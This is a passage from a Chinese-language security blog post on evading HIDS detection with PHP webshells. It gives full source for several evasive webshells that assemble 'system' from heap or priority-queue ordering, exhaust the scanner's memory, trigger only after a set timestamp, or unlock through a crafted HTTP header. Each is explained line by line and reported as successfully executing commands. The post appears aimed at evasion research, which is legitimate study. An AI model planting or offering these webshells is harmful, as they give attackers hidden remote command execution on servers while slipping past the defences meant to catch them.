+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165147644.png" alt="image-20250804165147644"></p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165153856.png" alt="image-20250804165153856"></p>
+<p> 由此可见：不同的参数值，能够引发堆结构的改变。经过多次Fuzz测试，我发现HIDS 查杀引擎对第三种情况没有考虑，于是，我通过依次将i取1和i取2来提取变量$a和$b， 再通过 $a($b); 执行命令。  当然，在这种情况下，利用的Payload 只能是 x.php?a&#x3D;99;whoami 这种格式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$obj=new SplMaxHeap(); </span><br><span class="line">$obj-&gt;insert( $_GET[a] ); </span><br><span class="line">$obj-&gt;insert( 8 ); </span><br><span class="line">$obj-&gt;insert( &#x27;system&#x27; ); </span><br><span class="line">$obj-&gt;insert( 7 ); </span><br><span class="line">$obj-&gt;insert( 0 ); </span><br><span class="line">//$obj-&gt;recoverFromCorruption(); </span><br><span class="line">$i=0; </span><br><span class="line"> </span><br><span class="line">foreach( $obj as $number ) &#123; </span><br><span class="line">    $i++; </span><br><span class="line"> </span><br><span class="line">    if($i==1) &#123; </span><br><span class="line"> </span><br><span class="line">        $a = $number; </span><br><span class="line">    &#125; </span><br><span class="line">    if($i==2) &#123; </span><br><span class="line"> </span><br><span class="line">        $b = $number; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
+
+<p>分析 </p>
+<h3 id="0x0D-优先级队列"><a href="#0x0D-优先级队列" class="headerlink" title="0x0D 优先级队列"></a>0x0D 优先级队列</h3><p>优先级队列与堆排序思想基本类似，不同的是，我这里使用优先级队列对system关键 词进行更细颗粒度的拆分。想办法让传参影响system每个字符的顺序。  请看样本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">$objPQ = new SplPriorityQueue(); </span><br><span class="line"> </span><br><span class="line">$objPQ-&gt;insert(&#x27;m&#x27;,1); </span><br><span class="line">$objPQ-&gt;insert(&#x27;s&#x27;,6); </span><br><span class="line">$objPQ-&gt;insert(&#x27;e&#x27;,2); </span><br><span class="line">$objPQ-&gt;insert(&#x27;s&#x27;,4); </span><br><span class="line">$objPQ-&gt;insert(&#x27;y&#x27;,5); </span><br><span class="line">$objPQ-&gt;insert(&#x27;t&#x27;,$_GET[&#x27;a&#x27;]); </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$objPQ-&gt;setExtractFlags(SplPriorityQueue::EXTR_DATA); </span><br><span class="line"> </span><br><span class="line">//Go to TOP </span><br><span class="line">$objPQ-&gt;top(); </span><br><span class="line"> </span><br><span class="line">$m=&#x27;&#x27;; </span><br><span class="line">$cur = new ErrorException($_GET[&#x27;b&#x27;]); </span><br><span class="line">while($objPQ-&gt;valid())&#123; </span><br><span class="line">    $m.=$objPQ-&gt;current(); </span><br><span class="line">    $objPQ-&gt;next(); </span><br><span class="line">&#125; </span><br><span class="line">echo $m($cur-&gt;getMessage()); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>用SplPriorityQueue 这个类 new了一个对象</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165347214.png" alt="image-20250804165347214"></p>
+<p>这个类中有优先级队列的一些方法</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165424317.png" alt="image-20250804165424317"></p>
+<p>这个</p>
+<p>$objPQ-&gt;insert(‘m’,1); </p>
+<p>我们可以看到官方文档说明他有两个参数，第一个就是要进行排序的值，第二个就是优先级，优先级越大，他排在最上面</p>
+<p>这里他就是想构造 system 只需要我们将a传入3就行</p>
+<p>然后他下面用了   setExtractFlags  这个方法 调用了 SplPriorityQueue::EXTR_DATA 这个常量</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165923460.png"></p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804170014276.png" alt="image-20250804170014276"></p>
+<p>也就是他想用 setExtractFlags 来提取优先级队列里面的数据</p>
+<p>也就是提取system</p>
+<p>然后他又调用了top这个方法</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804170153471.png" alt="image-20250804170153471"></p>
+<p>让他从顶部开始查看节点</p>
+<p>$cur &#x3D; new ErrorException($_GET[b]);</p>
+<p>这里他又用了这个抛出错误这个类创建一个对象，然后通过getmessage()这个方法来传入我们的命令</p>
+<p>然后下面那个循环</p>
+<p>他先调用了valid ，来检查队列是否有多个节点，返回类型bool型，满足条件</p>
+<p>然后又用 current来指向当前的节点 因为前面调用了top 所以从上往下指</p>
+<p>然后next 依次往下指，取出了我们的system ，在进行了拼接命令执行函数</p>
+<p>测试</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804171233692.png" alt="image-20250804171233692"></p>
+<p>成功执行</p>
+<h3 id="0x0E-内存不足"><a href="#0x0E-内存不足" class="headerlink" title="0x0E 内存不足"></a>0x0E 内存不足</h3><p>内存不足的思想是：查杀引擎的动态执行需要消耗内存空间，由于同一时间处理的样本 很多，因此单独给每个沙箱环境分配的内存往往不会太多，如果我构造一个样本，能够让查 杀引擎由于内存不足提前终止查杀，而在真实环境中内存可以满足执行需要，就能够执行到 恶意的代码了，恰好PHP的内存申请是可以通过php_ini在运行时动态修改的。  请看样本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line"> </span><br><span class="line">class b extends SplObjectStorage &#123; </span><br><span class="line">    public function getHash($o) &#123; </span><br><span class="line">        return get_class($o); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">$cur= new  DomainException($_GET[a]); </span><br><span class="line">?&gt; </span><br><span class="line">    111111111111111111111111111111111111111111111111 </span><br><span class="line"> </span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">ini_set(&quot;memory_limit&quot;,&quot;100G&quot;); </span><br><span class="line">echo memory_get_usage().&#x27;&lt;br&gt;&#x27;; </span><br><span class="line">$var = str_repeat(&quot;php7_do9gy&quot;, 100000000); </span><br><span class="line">echo memory_get_usage(); </span><br><span class="line">class bb&#123;&#125;</span><br><span class="line">?&gt; </span><br><span class="line">    111111111111111111111111111111111111111111111111 </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">class A &#123;&#125; </span><br><span class="line"> </span><br><span class="line">$s = new b; </span><br><span class="line"> </span><br><span class="line">$o2 = new stdClass; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$s[$o2] = &#x27;system&#x27;; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//these are considered equal to the objects before </span><br><span class="line">//so they can be used to access the values stored under them </span><br><span class="line">$p1 = new stdClass; </span><br><span class="line">echo $s[$p1]($cur-&gt;getMessage()); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>第一段php代码：</p>
+<p>他先定义了一个b类继承了SplObjectStorage类的属性和方法，重写了getHash这个方法</p>
+<p>让他返回对象名</p>
+<p>然后</p>
+<p>他又new了一个对象通过DomainException这个类，也是一个抛出异常的一个类，$_GET[a]应该就是我们执行的参数，通过getmessage来获取</p>
+<p>第二段php代码：</p>
+<p>他初始化了一个 memory_limit  分配了100g的内存</p>
+<p>然后他打印了一下这个 内存量，然后他又用str_repeat这个函数 一直重复的赋值 php7_do9gy这个字符串</p>
+<p>100000000次</p>
+<p>然后他又打印了一下</p>
+<p>并定义了一个空的类bb</p>
+<p>第三段php代码：</p>
+<p>首先定义了一个空A类</p>
+<p>然后通过b类new了一个$s这个对象，</p>
+<p>又通过stdClass这个类 new 了一个o2的对象</p>
+<p>然后他将$s[$o2] &#x3D; ‘system’; </p>
+<p>然后又用 stdClass 这个类new了一个p1的对象</p>
+<p>最后进行拼接打印输出</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804173630947.png" alt="image-20250804173630947"></p>
+<p>可以看到最开始内存占用是 403984  变成了1000405544 </p>
+<p>成功</p>
+<h3 id="0x0F-未来WebShell"><a href="#0x0F-未来WebShell" class="headerlink" title="0x0F 未来WebShell"></a>0x0F 未来WebShell</h3><p>思路：动态查杀是基于PHP 文件上传后动态执行的，那么有没有可能上传一个文件， 上传时它还不是WebShell，它自己过几分钟变成一个 WebShell呢？这样在上传时就可以躲 过动态查杀。正好，结合0x05和0x06两种模式，我们尽可能将是否为WebShell的判断依 据前置到一个if条件中，然后让这个条件以当前时间为依据，那么上传时的Unix时间戳小 于某个值，返回结果True，动态引擎自然判定这是一个正常的文件，而过一段时间，时间变 化了返回结果变为了False，再去请求这个WebShell 自然就能够执行了。  一直想构造这样一个未来的webshell，但是由于网站对时间相关的函数过滤很严，直到我发 现了DateTime类的getTimestamp方法。  仅有这个思路是不够的，在实现时，还结合了反射的技巧以及PHP条件优化。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">function foo($test, $bar = FSYSTEM) </span><br><span class="line">&#123; </span><br><span class="line">    echo $test . $bar; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;foo&#x27;); </span><br><span class="line">$q = new ParseError($_GET[a]); </span><br><span class="line">foreach ($function-&gt;getParameters() as $param) &#123; </span><br><span class="line">    $da = new DateTime(); </span><br><span class="line"> </span><br><span class="line">    echo $da-&gt;getTimestamp(); </span><br><span class="line">    echo &#x27;Name: &#x27; . $param-&gt;getName() . PHP_EOL; </span><br><span class="line">    $n=&#x27;F&#x27;; </span><br><span class="line">    if ($param-&gt;isOptional()) &#123; </span><br><span class="line">        if($da-&gt;getTimestamp()&gt;=1648470471||$n=&#x27;1&#x27;)&#123; </span><br><span class="line">            echo $n; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        echo &#x27;Default value: &#x27; . </span><br><span class="line">ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </span><br><span class="line">    &#125; </span><br><span class="line">    echo PHP_EOL; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>他先定义了一个foo的函数里面有两个参数，test没有默认值，需要用户传入，bar有默认值，用户可传可不传</p>
+<p>然后 通过ReflectionFunction这个类创建了一个function这个对象，这个类英文翻译为反射函数</p>
+<p>我们可以知道，他将foo这个函数的属性给了$function </p>
+<p>然后他又通过了 ParseError这个类抛出异常来接收我们要执行的命令</p>
+<p>if判断里面用 getParameters 获取了一下$function 的参数，也就是获取到了 test，和bar</p>
+<p>用这两个参数进行循环</p>
+<p>循环里面，他用DateTime 这个类创建了一个对象 $da，然后用getTimestamp() 获取了一下unix时间戳并打印出来，然后 getName获取属性名赋值给$param， 然后将$n&#x3D;’F’; </p>
+<p>进入下面的判断</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175239499.png" alt="image-20250804175239499"></p>
+<p>isOptional() 调用这个方法来判断$param 里面的属性是否是可选的参数，也就是可以传值也可以不传值的参数</p>
+<p>if($da-&gt;getTimestamp()&gt;&#x3D;1648470471||$n&#x3D;’1’)</p>
+<p>这里这个判断 如果时间戳大于 就不$n&#x3D;’1’进行这个赋值  直接往下继续执行了，如果小于就将 $n&#x3D;’1’ 进行赋值</p>
+<p>最后ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </p>
+<p>调用这个来构造system()，这里他是通过getDefaultValueConstantName来获取默认的参数值，并交给ltrim进行清洗掉$n，也就是将FSYSTEM 中的F 去掉，就刚好是我们的system，如果这个$n是1 的话，它里面没有1 所以不做处理，会让waf认为是正常函数，污点就会断掉，只有在特定的时间才会触发</p>
+<p>测试</p>
+<p>这里我们修改一下这个时间戳为1754301527</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175826475.png" alt="image-20250804175826475"></p>
+<p>等下时间到</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804175852801.png" alt="image-20250804175852801"></p>
+<p>成功执行</p>
+<h3 id="0x10-量子WebShell"><a href="#0x10-量子WebShell" class="headerlink" title="0x10 量子WebShell"></a>0x10 量子WebShell</h3><p>不满足于未来WebShell的挖掘，我又找到了一种新的模式——量子WebShell。在PHP 引擎查杀时，利用随机数，让判断条件在大多数情况下都不成立，此时这个WebShell处于 是WebShell和非WebShell的叠加态，当且仅当参数传递缩小随机数生成范围以后，让条件 恒成立，此时该样本坍缩到一个WebShell的状态，可以稳定触发。  请看代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">function foo($test, $bar = FSYSTEM) </span><br><span class="line">&#123; </span><br><span class="line">    echo $test . $bar; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;foo&#x27;); </span><br><span class="line">$q = new ParseError($_GET[a]); </span><br><span class="line">$p = new ParseError($_SERVER[HTTP_A]); </span><br><span class="line">foreach ($function-&gt;getParameters() as $param) &#123; </span><br><span class="line">    $da = new DateTime(); </span><br><span class="line"> </span><br><span class="line">    echo $da-&gt;getTimestamp(); </span><br><span class="line">    echo &#x27;Name: &#x27; . $param-&gt;getName() . PHP_EOL; </span><br><span class="line">    $n=&#x27;F&#x27;; </span><br><span class="line">    if ($param-&gt;isOptional()) &#123; </span><br><span class="line">        if(mt_rand(55,$p-&gt;getMessage()??100)==55||$n=&#x27;1&#x27;)&#123; </span><br><span class="line">            echo $n; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        echo &#x27;Default value: &#x27; . </span><br><span class="line">ltrim($param-&gt;getDefaultValueConstantName(),$n)($q-&gt;getMessage()); </span><br><span class="line">    &#125; </span><br><span class="line">    echo PHP_EOL; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这里他跟前面列子不一样的地方就是判断的地方</p>
+<p>前面还是一样用反射函数构建等等。。。</p>
+<p>(mt_rand(55,$p-&gt;getMessage()??100)&#x3D;&#x3D;55||$n&#x3D;’1’)</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804180322020.png" alt="image-20250804180322020"></p>
+<p>他通过mt_rand这个函数来随机取值，如果我们的$_SERVER[HTTP_A]没传值 getMessage()这个就接收不到参数</p>
+<p>他的范围就(55，100), 这样经过mt_rand()很难精准的取到55，所以这里我们传值就传55，让他定死</p>
+<p>$p &#x3D; new ParseError($_SERVER[HTTP_A]); </p>
+<p>就伪造一个header头 HTTP_A:55</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804183338675.png" alt="image-20250804183338675"></p>
+<p>这样他前面的条件一直成立，就不会重新赋值给$n,我们的$n就是F 就可以经过ltrim 清洗掉F ，构造出SYSTEM</p>
+<p>测试</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804183353029.png" alt="image-20250804183353029"></p>
+<p>成功执行</p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/">https://heisha123.github.io/2025/07/30/HIDS-PHP-Webshell-Bypass-研究分析/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2];
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var valineObj = window.GLOBAL_CONFIG.valine;
+        new Valine({
+            el: "#comments-container",
+            ...valineObj
+        });
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/"><i class="fas fa-angle-left">&nbsp;</i><span>应急响应 windows篇</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/28/upload-labs-%E9%9D%B6%E5%9C%BA/"><span>upload-labs 靶场</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
